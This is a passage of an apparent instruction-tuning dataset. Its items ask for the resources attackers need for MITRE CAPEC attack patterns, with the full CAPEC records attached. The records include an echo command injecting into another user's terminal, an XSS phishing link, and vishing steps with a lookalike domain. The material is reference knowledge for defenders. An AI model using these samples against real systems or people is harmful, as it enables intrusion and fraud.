        "Description": "An attacker is able to discover and query Micro-services at a web location and thereby expose the Micro-services to further exploitation by gathering information about their implementation and function. Micro-services in web pages allow portions of a page to connect to the server and update content without needing to cause the entire page to update. This allows user activity to change portions of the page more quickly without causing disruptions elsewhere.",
        "Extended_Description": {
          "xhtml:p": "However, these micro-services may not be subject to the same level of security review as other forms of content. For example, a micro-service that posts requests to a server that are turned into SQL queries may not adequately protect against SQL-injection attacks. As a result, micro-services may provide another vector for a range of attacks. It should be emphasized that the presence of micro-services does not necessarily make a site vulnerable to attack, but they do provide additional complexity to a web page and therefore may contain vulnerabilities that support other attack patterns."
        },
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "554"
          }
        },
        "Prerequisites": {
          "Prerequisite": "The target site must use micro-services that interact with the server and one or more of these micro-services must be vulnerable to some other attack pattern."
        },
        "Resources_Required": {
          "Resource": "The attacker usually needs to be able to invoke micro-services directly in order to control the parameters that are used in their attack. The attacker may require other resources depending on the nature of the flaw in the targeted micro-service."
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2015-12-07",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2015-12-07",
            "#text": "Discovering, querying, and finally calling micro-services, such as w/ AJAX"
          }
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: Manipulating Writeable Terminal Devices (CAPEC ID: 40)",
    "context": "",
    "output": "required resources:\nAccess to a terminal on the target network",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Access to a terminal on the target network",
      "@Name": "Manipulating Writeable Terminal Devices (CAPEC ID: 40)",
      "attack_ptrn": {
        "@ID": "40",
        "@Name": "Manipulating Writeable Terminal Devices",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "This attack exploits terminal devices that allow themselves to be written to by other users. The attacker sends command strings to the target terminal device hoping that the target user will hit enter and thereby execute the malicious command with their privileges. The attacker can send the results (such as copying /etc/passwd) to a known directory and collect once the attack has succeeded.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "248"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Identify attacker-writable terminals] Determine if users TTYs are writable by the attacker.",
              "Technique": [
                "Determine the permissions for the TTYs found on the system. Any that allow user write to the TTY may be vulnerable.",
                "Attempt to write to other user TTYs. This approach could leave a trail or alert a user."
              ]
            },
            {
              "Step": "2",
              "Phase": "Exploit",
              "Description": "[Execute malicious commands] Using one or more vulnerable TTY, execute commands to achieve various impacts.",
              "Technique": "Commands that allow reading or writing end user files can be executed."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "User terminals must have a permissive access control such as world writeable that allows normal users to control data on other user's terminals."
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Low",
            "#text": "Ability to discover permissions on terminal devices. Of course, brute force can also be used."
          }
        },
        "Resources_Required": {
          "Resource": "Access to a terminal on the target network"
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Ensure that terminals are only writeable by named owner user and/or administrator",
            "Design: Enforce principle of least privilege"
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "\"Any system that allows other peers to write directly to its terminal process is vulnerable to this type of attack. If the terminals are available through being over-privileged (i.e. world-writable) or the attacker is an administrator, then a series of commands in this format can be used to echo commands out to victim terminals.",
              "where XX is the tty number of the user under attack. This will paste the characters to another terminal (tty). Note this technique works only if the victim's tty is world writable (which it may not be). That is one reason why programs like write(1) and talk(1) in UNIX systems need to run setuid.\" [REF-1]",
              "If the victim continues to hit \"enter\" and execute the commands, there are an endless supply of vectors available to the attacker, copying files, open up network connections, ftp out to servers, and so on."
            ],
            "xhtml:div": {
              "@style": "margin-left:1em;",
              "@class": "informative",
              "#text": "\"$echo -e \"\\033[30m\\033\\132\" > /dev/ttyXX"
            }
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "77"
          }
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-1"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Phases, Description, Description Summary, Related_Vulnerabilities"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2018-07-31",
              "Modification_Comment": "Updated Attacker_Skills_or_Knowledge_Required, Related_Attack_Patterns, Type (Attack_Pattern -> Relationship)"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Example_Instances"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: Cross-Site Scripting (XSS) (CAPEC ID: 63)",
    "context": "",
    "output": "required resources:\nAbility to deploy a custom hostile service for access by targeted clients. Ability to communicate synchronously or asynchronously with client machine.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Ability to deploy a custom hostile service for access by targeted clients. Ability to communicate synchronously or asynchronously with client machine.",
      "@Name": "Cross-Site Scripting (XSS) (CAPEC ID: 63)",
      "attack_ptrn": {
        "@ID": "63",
        "@Name": "Cross-Site Scripting (XSS)",
        "@Abstraction": "Standard",
        "@Status": "Draft",
        "Description": "An adversary embeds malicious scripts in content that will be served to web browsers. The goal of the attack is for the target software, the client-side browser, to execute the script with the users' privilege level. An attack of this type exploits a programs' vulnerabilities that are brought on by allowing remote hosts to execute code and scripts. Web browsers, for example, have some simple security controls in place, but if a remote attacker is allowed to execute scripts (through injecting them in to user-generated content like bulletin boards) then these controls may be bypassed. Further, these attacks are very difficult for an end user to detect.",
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "Very High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": [
            {
              "@Nature": "ChildOf",
              "@CAPEC_ID": "242"
            },
            {
              "@Nature": "CanPrecede",
              "@CAPEC_ID": "107"
            }
          ]
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Survey the application for user-controllable inputs] Using a browser or an automated tool, an attacker follows all public links and actions on a web site. They record all the links, the forms, the resources accessed and all other potential entry-points for the web application.",
              "Technique": [
                "Use a spidering tool to follow and record all links and analyze the web pages to find entry points. Make special note of any links that include parameters in the URL.",
                "Use a proxy tool to record all links visited during a manual traversal of the web application.",
                "Use a browser to manually explore the website and analyze how it is constructed. Many browsers' plugins are available to facilitate the analysis or automate the discovery."
              ]
            },
            {
              "Step": "2",
              "Phase": "Experiment",
              "Description": "[Probe identified potential entry points for XSS vulnerability] The attacker uses the entry points gathered in the \"Explore\" phase as a target list and injects various common script payloads to determine if an entry point actually represents a vulnerability and to characterize the extent to which the vulnerability can be exploited.",
              "Technique": [
                "Use a list of XSS probe strings to inject script in parameters of known URLs. If possible, the probe strings contain a unique identifier.",
                "Use a proxy tool to record results of manual input of XSS probes in known URLs.",
                "Use a list of XSS probe strings to inject script into UI entry fields. If possible, the probe strings contain a unique identifier.",
                "Use a list of XSS probe strings to inject script into resources accessed by the application. If possible, the probe strings contain a unique identifier."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Steal session IDs, credentials, page content, etc.] As the attacker succeeds in exploiting the vulnerability, they can choose to steal user's credentials in order to reuse or to analyze them later on.",
              "Technique": [
                "Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and sends document information to the attacker.",
                "Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute appropriately."
              ]
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Forceful browsing] When the attacker targets the current application or another one (through CSRF vulnerabilities), the user will then be the one who perform the attacks without being aware of it. These attacks are mostly targeting application logic flaws, but it can also be used to create a widespread attack against a particular website on the user's current network (Internet or not).",
              "Technique": [
                "Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and performs actions on the same web site",
                "Develop malicious JavaScript that injected through vectors identified during the Experiment Phase and takes commands from an attacker's server and then causes the browser to execute request to other web sites (especially the web applications that have CSRF vulnerabilities)."
              ]
            },
            {
              "Step": "5",
              "Phase": "Exploit",
              "Description": "[Content spoofing] By manipulating the content, the attacker targets the information that the user would like to get from the website.",
              "Technique": "Develop malicious JavaScript that is injected through vectors identified during the Experiment Phase and loaded by the victim's browser and exposes attacker-modified invalid information to the user on the current web page."
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": "Target client software must be a client that allows scripting communication from remote hosts, such as a JavaScript-enabled Web Browser."
        },
        "Skills_Required": {
          "Skill": [
            {
              "@Level": "Low",
              "#text": "To achieve a redirection and use of less trusted source, an attacker can simply place a script in bulletin board, blog, wiki, or other user-generated content site that are echoed back to other client machines."
            },
            {
              "@Level": "High",
              "#text": "Exploiting a client side vulnerability to inject malicious scripts into the browser's executable process."
            }
          ]
        },
        "Resources_Required": {
          "Resource": "Ability to deploy a custom hostile service for access by targeted clients. Ability to communicate synchronously or asynchronously with client machine."
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Integrity",
                "Availability"
              ],
              "Impact": "Execute Unauthorized Commands",
              "Note": "Run Arbitrary Code"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": [
            "Design: Use browser technologies that do not allow client side scripting.",
            "Design: Utilize strict type, character, and encoding enforcement",
            "Design: Server side developers should not proxy content via XHR or other means, if a http proxy for remote content is setup on the server side, the client's browser has no way of discerning where the data is originating from.",
            "Implementation: Ensure all content that is delivered to client is sanitized against an acceptable content specification.",
            "Implementation: Perform input validation for all remote content.",
            "Implementation: Perform output validation for all remote content.",
            "Implementation: Session tokens for specific host",
            "Implementation: Patching software. There are many attack vectors for XSS on the client side and the server side. Many vulnerabilities are fixed in service packs for browser, web servers, and plug in technologies, staying current on patch release that deal with XSS countermeasures mitigates this."
          ]
        },
        "Example_Instances": {
          "Example": {
            "xhtml:p": [
              "Classic phishing attacks lure users to click on content that appears trustworthy, such as logos, and links that seem to go to their trusted financial institutions and online auction sites. But instead the attacker appends malicious scripts into the otherwise innocent appearing resources. The HTML source for a standard phishing attack looks like this:",
              "When the user clicks the link, the appended script also executes on the local user's machine."
            ],
            "xhtml:div": {
              "@style": "margin-left:1em;",
              "@class": "attack",
              "#text": "<a href=\"www.exampletrustedsite.com?Name=<script>maliciousscript</script>\">Trusted Site</a>"
            }
          }
        },
        "Related_Weaknesses": {
          "Related_Weakness": [
            {
              "@CWE_ID": "79"
            },
            {
              "@CWE_ID": "20"
            }
          ]
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "WASC",
              "Entry_ID": "08",
              "Entry_Name": "Cross-Site Scripting"
            },
            {
              "@Taxonomy_Name": "OWASP Attacks",
              "Entry_Name": "Cross Site Scripting (XSS)"
            }
          ]
        },
        "References": {
          "Reference": {
            "@External_Reference_ID": "REF-1"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-05-01",
              "Modification_Comment": "Updated Activation_Zone, Attack_Prerequisites, Description Summary, Examples-Instances, Payload, Payload_Activation_Impact, Related_Attack_Patterns, Related_Weaknesses, Resources_Required, Typical_Likelihood_of_Exploit"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Execution_Flow"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Related_Attack_Patterns, Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-09-29",
              "Modification_Comment": "Updated Example_Instances"
            }
          ],
          "Previous_Entry_Name": {
            "@Date": "2017-05-01",
            "#text": "Simple Script Injection"
          }
        }
      }
    }
  },
  {
    "instruction": "Provide the resources needed so the attacker can use the attack pattern: Sustained Client Engagement (CAPEC ID: 227)",
    "context": "",
    "output": "Here is the list of resources required to implement attack pattern Sustained Client Engagement (CAPEC ID: 227):\nTo successfully execute this pattern of attack, a script or program is often required that is capable of continually engaging the target and maintaining sustained usage of a specific resource. Depending on the configuration of the target, it may or may not be necessary to involve a network or cluster of objects all capable of making parallel requests.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "To successfully execute this pattern of attack, a script or program is often required that is capable of continually engaging the target and maintaining sustained usage of a specific resource. Depending on the configuration of the target, it may or may not be necessary to involve a network or cluster of objects all capable of making parallel requests.",
      "@Name": "Sustained Client Engagement (CAPEC ID: 227)",
      "attack_ptrn": {
        "@ID": "227",
        "@Name": "Sustained Client Engagement",
        "@Abstraction": "Meta",
        "@Status": "Draft",
        "Description": "An adversary attempts to deny legitimate users access to a resource by continually engaging a specific resource in an attempt to keep the resource tied up as long as possible. The adversary's primary goal is not to crash or flood the target, which would alert defenders; rather it is to repeatedly perform actions or abuse algorithmic flaws such that a given resource is tied up and not available to a legitimate user. By carefully crafting a requests that keep the resource engaged through what is seemingly benign requests, legitimate users are limited or completely denied access to the resource.",
        "Extended_Description": {
          "xhtml:p": "The degree to which the attack is successful depends upon the adversary's ability to sustain resource requests over time with a volume that exceeds the normal usage by legitimate users, as well as other mitigating circumstances such as the target's ability to shift load or acquire additional resources to deal with the depletion. This attack differs from a flooding attack as it is not entirely dependent upon large volumes of requests, and it differs from resource leak exposures which tend to exploit the surrounding environment needed for the resource to function. The key factor in a sustainment attack are the repeated requests that take longer to process than usual."
        },
        "Prerequisites": {
          "Prerequisite": "This pattern of attack requires a temporal aspect to the servicing of a given request. Success can be achieved if the adversary can make requests that collectively take more time to complete than legitimate user requests within the same time frame."
        },
        "Resources_Required": {
          "Resource": "To successfully execute this pattern of attack, a script or program is often required that is capable of continually engaging the target and maintaining sustained usage of a specific resource. Depending on the configuration of the target, it may or may not be necessary to involve a network or cluster of objects all capable of making parallel requests."
        },
        "Mitigations": {
          "Mitigation": "Potential mitigations include requiring a unique login for each resource request, constraining local unprivileged access by disallowing simultaneous engagements of the resource, or limiting access to the resource to one access per IP address. In such scenarios, the adversary would have to increase engagements either by launching multiple sessions manually or programmatically to counter such defenses."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "400"
          }
        },
        "Taxonomy_Mappings": {
          "Taxonomy_Mapping": [
            {
              "@Taxonomy_Name": "ATTACK",
              "Entry_ID": "1499",
              "Entry_Name": "Endpoint Denial of Service"
            },
            {
              "@Taxonomy_Name": "WASC",
              "Entry_ID": "10",
              "Entry_Name": "Denial of Service"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-07-30",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2020-12-17",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2021-06-24",
              "Modification_Comment": "Updated Taxonomy_Mappings"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2022-02-22",
              "Modification_Comment": "Updated Description, Extended_Description"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2023-01-24",
              "Modification_Comment": "Updated Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "Given the attack pattern: Voice Phishing (CAPEC ID: 656), tell me required resources from an attacker",
    "context": "",
    "output": "Sure. Here are the required resources the attacker should have:\nLegitimate-looking telephone number(s) to initiate calls with victims",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "Legitimate-looking telephone number(s) to initiate calls with victims",
      "@Name": "Voice Phishing (CAPEC ID: 656)",
      "attack_ptrn": {
        "@ID": "656",
        "@Name": "Voice Phishing",
        "@Abstraction": "Detailed",
        "@Status": "Stable",
        "Description": "An adversary targets users with a phishing attack for the purpose of soliciting account passwords or sensitive information from the user. Voice Phishing is a variation of the Phishing social engineering technique where the attack is initiated via a voice call, rather than email. The user is enticed to provide sensitive information by the adversary, who masquerades as a legitimate employee of the alleged organization. Voice Phishing attacks deviate from standard Phishing attacks, in that a user doesn't typically interact with a compromised website to provide sensitive information and instead provides this information verbally. Voice Phishing attacks can also be initiated by either the adversary in the form of a \"cold call\" or by the victim if calling an illegitimate telephone number.",
        "Alternate_Terms": {
          "Alternate_Term": [
            {
              "Term": "Vishing"
            },
            {
              "Term": "VoIP Phishing"
            }
          ]
        },
        "Likelihood_Of_Attack": "High",
        "Typical_Severity": "High",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "98"
          }
        },
        "Execution_Flow": {
          "Attack_Step": [
            {
              "Step": "1",
              "Phase": "Explore",
              "Description": "[Obtain domain name and certificate to spoof legitimate site] This optional step can be used to help the adversary impersonate the legitimate organization more convincingly. The adversary can use homograph or similar attacks to convince users that they are using the legitimate website. If the adversary leverages cold-calling for this attack, this step is skipped.",
              "Technique": [
                "Optionally obtain a domain name that visually looks similar to the legitimate organization's domain name. An example is www.paypaI.com vs. www.paypal.com (the first one contains a capital i, instead of a lower case L)",
                "Optionally obtain a legitimate SSL certificate for the new domain name."
              ]
            },
            {
              "Step": "2",
              "Phase": "Explore",
              "Description": "[Explore legitimate website and create duplicate] An adversary optionally creates a website (optionally at a URL that looks similar to the original URL) that closely resembles the organization's website that they are trying to impersonate. That website will contain a telephone number for the victim to call to assist them with their issue and initiate the attack. If the adversary leverages cold-calling for this attack, this step is skipped.",
              "Technique": [
                "Use spidering software to get copy of web pages on legitimate site.",
                "Manually save copies of required web pages from legitimate site.",
                "Create new web pages that have the legitimate site's look and feel, but contain completely new content."
              ]
            },
            {
              "Step": "3",
              "Phase": "Exploit",
              "Description": "[Convince user to provide sensitive information to the adversary.] An adversary \"cold calls\" the victim or receives a call from the victim via the malicious site and provides a call-to-action, in order to persuade the user into providing sensitive details to the adversary (e.g. login credentials, bank account information, etc.). The key is to get the victim to believe that the individual they are talking to is from a legitimate entity with which the victim does business and that the call is occurring for legitimate reasons. A call-to-action will usually need to sound legitimate and urgent enough to prompt action from the user.",
              "Technique": "Call the user a from a spoofed legitimate-looking telephone number."
            },
            {
              "Step": "4",
              "Phase": "Exploit",
              "Description": "[Use stolen information] Once the adversary obtains the sensitive information, this information can be leveraged to log into the victim's bank account and transfer money to an account of their choice, or to make fraudulent purchases with stolen credit card information.",
              "Technique": "Login to the legitimate site using another the victim's supplied credentials"
            }
          ]
        },
        "Prerequisites": {
          "Prerequisite": [
            "An adversary needs phone numbers to initiate contact with the victim, in addition to a legitimate-looking telephone number to call the victim from.",
            "An adversary needs to correctly guess the entity with which the victim does business and impersonate it. Most of the time phishers just use the most popular banks/services and send out their \"hooks\" to many potential victims.",
            "An adversary needs to have a sufficiently compelling call to action to prompt the user to take action.",
            "If passively conducting this attack via a spoofed website, replicated website needs to look extremely similar to the original website and the URL used to get to that website needs to look like the real URL of the said business entity."
          ]
        },
        "Skills_Required": {
          "Skill": {
            "@Level": "Medium",
            "#text": "Basic knowledge about websites: obtaining them, designing and implementing them, etc."
          }
        },
        "Resources_Required": {
          "Resource": "Legitimate-looking telephone number(s) to initiate calls with victims"
        },
        "Indicators": {
          "Indicator": [
            "You receive a call from an entity that you are not even a customer of prompting you to log into your account.",
            "You receive any call that requests you provide sensitive information.",
            "You are redirected to a website that instructs you to call the number on-screen to address the call-to-action."
          ]
        },
        "Consequences": {
          "Consequence": [
            {
              "Scope": [
                "Confidentiality",
                "Access Control",
                "Authorization"
              ],
              "Impact": "Gain Privileges"
            },
            {
              "Scope": "Confidentiality",
              "Impact": "Read Data"
            },
            {
              "Scope": "Integrity",
              "Impact": "Modify Data"
            }
          ]
        },
        "Mitigations": {
          "Mitigation": "Do not accept calls from unknown numbers or from numbers that may be flagged as spam. Also, do not call numbers that appear on-screen after being unexpectedly redirected to potentially malicious websites. In either case, do not provide sensitive information over voice calls that are not legitimately initiated. Instead, call your Bank, PayPal, eBay, etc., via the number on their public-facing website and inquire about the problem."
        },
        "Example_Instances": {
          "Example": [
            "The target receives an email or text message stating that their Apple ID has been disabled due to suspicious activity and that the included link includes instructions on how to unlock their Apple account. The link in the text message looks legitimate and once the link is clicked, the user is redirected to a legitimate-looking webpage that prompts the user to call a specified number to initiate the unlock process. The target initiates the phone call and provides their credentials or other sensitive information to the individual they assume works for Apple. Now that the adversary possess this data, it can be used to log into the account to obtain other sensitive data, such as Apple Pay information.",
            "An adversary calls the target and claims to work for their bank. The adversary informs the target that their bank account has been frozen, due to potential fraudulent spending, and requires authentication in order to re-enable the account. The target, believing the caller is a legitimate bank employee, provides their bank account login credentials to confirm they are the authorized owner of the account. The adversary then confirms this authentication and claims that the account has been unlocked. Once the adversary has obtained these credentials, money can be transferred from the victim's account to an account controlled by the adversary."
          ]
        },
        "References": {
          "Reference": [
            {
              "@External_Reference_ID": "REF-592"
            },
            {
              "@External_Reference_ID": "REF-594"
            },
            {
              "@External_Reference_ID": "REF-595"
            }
          ]
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2020-12-17"
          }
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: Checksum Spoofing (CAPEC ID: 145)",
    "context": "",
    "output": "required resources:\nThe adversary must have a utility that can intercept and modify messages between the sender and recipient.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The adversary must have a utility that can intercept and modify messages between the sender and recipient.",
      "@Name": "Checksum Spoofing (CAPEC ID: 145)",
      "attack_ptrn": {
        "@ID": "145",
        "@Name": "Checksum Spoofing",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An adversary spoofs a checksum message for the purpose of making a payload appear to have a valid corresponding checksum. Checksums are used to verify message integrity. They consist of some value based on the value of the message they are protecting. Hash codes are a common checksum mechanism. Both the sender and recipient are able to compute the checksum based on the contents of the message. If the message contents change between the sender and recipient, the sender and recipient will compute different checksum values. Since the sender's checksum value is transmitted with the message, the recipient would know that a modification occurred. In checksum spoofing an adversary modifies the message body and then modifies the corresponding checksum so that the recipient's checksum calculation will match the checksum (created by the adversary) in the message. This would prevent the recipient from realizing that a change occurred.",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "148",
            "Exclude_Related": [
              {
                "@Exclude_ID": "512"
              },
              {
                "@Exclude_ID": "515"
              }
            ]
          }
        },
        "Prerequisites": {
          "Prerequisite": [
            "The adversary must be able to intercept a message from the sender (keeping the recipient from getting it), modify it, and send the modified message to the recipient.",
            "The sender and recipient must use a checksum to protect the integrity of their message and transmit this checksum in a manner where the adversary can intercept and modify it.",
            "The checksum value must be computable using information known to the adversary. A cryptographic checksum, which uses a key known only to the sender and recipient, would thwart this attack."
          ]
        },
        "Resources_Required": {
          "Resource": "The adversary must have a utility that can intercept and modify messages between the sender and recipient."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "354"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2017-08-04",
              "Modification_Comment": "Updated Attack_Prerequisites, Description Summary, Resources_Required"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Attack_Patterns, Related_Weaknesses"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "What are the required resources to execute the attack pattern: Flash File Overlay (CAPEC ID: 181)",
    "context": "",
    "output": "The resources required to execute Flash File Overlay (CAPEC ID: 181) are the following: The attacker must be able to force the Flash overlay over the decoy content.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "The attacker must be able to force the Flash overlay over the decoy content.",
      "@Name": "Flash File Overlay (CAPEC ID: 181)",
      "attack_ptrn": {
        "@ID": "181",
        "@Name": "Flash File Overlay",
        "@Abstraction": "Detailed",
        "@Status": "Draft",
        "Description": "An attacker creates a transparent overlay using flash in order to intercept user actions for the purpose of performing a clickjacking attack. In this technique, the Flash file provides a transparent overlay over HTML content. Because the Flash application is on top of the content, user actions, such as clicks, are caught by the Flash application rather than the underlying HTML. The action is then interpreted by the overlay to perform the actions the attacker wishes.",
        "Typical_Severity": "Medium",
        "Related_Attack_Patterns": {
          "Related_Attack_Pattern": {
            "@Nature": "ChildOf",
            "@CAPEC_ID": "103",
            "Exclude_Related": {
              "@Exclude_ID": "403"
            }
          }
        },
        "Prerequisites": {
          "Prerequisite": [
            "The victim must be tricked into navigating to the attackers' decoy site and performing the actions on the decoy page.",
            "The victim's browser must support invisible Flash overlays."
          ]
        },
        "Resources_Required": {
          "Resource": "The attacker must be able to force the Flash overlay over the decoy content."
        },
        "Related_Weaknesses": {
          "Related_Weakness": {
            "@CWE_ID": "1021"
          }
        },
        "Content_History": {
          "Submission": {
            "Submission_Name": "CAPEC Content Team",
            "Submission_Organization": "The MITRE Corporation",
            "Submission_Date": "2014-06-23"
          },
          "Modification": [
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-04-04",
              "Modification_Comment": "Updated Related_Weaknesses"
            },
            {
              "Modification_Name": "CAPEC Content Team",
              "Modification_Organization": "The MITRE Corporation",
              "Modification_Date": "2019-09-30",
              "Modification_Comment": "Updated Related_Attack_Patterns"
            }
          ]
        }
      }
    }
  },
  {
    "instruction": "List the required resources to perform the following capec attack pattern: Authentication Bypass (CAPEC ID: 115)",
    "context": "",
    "output": "required resources:\nA client application, such as a web browser, or a scripting language capable of interacting with the target.",
    "category": "CAPECFlan",
    "instruction_type": "capec_resources_required",
    "parsed_raw_data": {
      "Resources_Required": "A client application, such as a web browser, or a scripting language capable of interacting with the target.",
      "@Name": "Authentication Bypass (CAPEC ID: 115)",
      "attack_ptrn": {
        "@ID": "115",
        "@Name": "Authentication Bypass",
        "@Abstraction": "Meta",
        "@Status": "Draft",
        "Description": "An attacker gains access to application, service, or device with the privileges of an authorized or privileged user by evading or circumventing an authentication mechanism. The attacker is therefore able to access protected data without authentication ever having taken place.",
        "Extended_Description": {
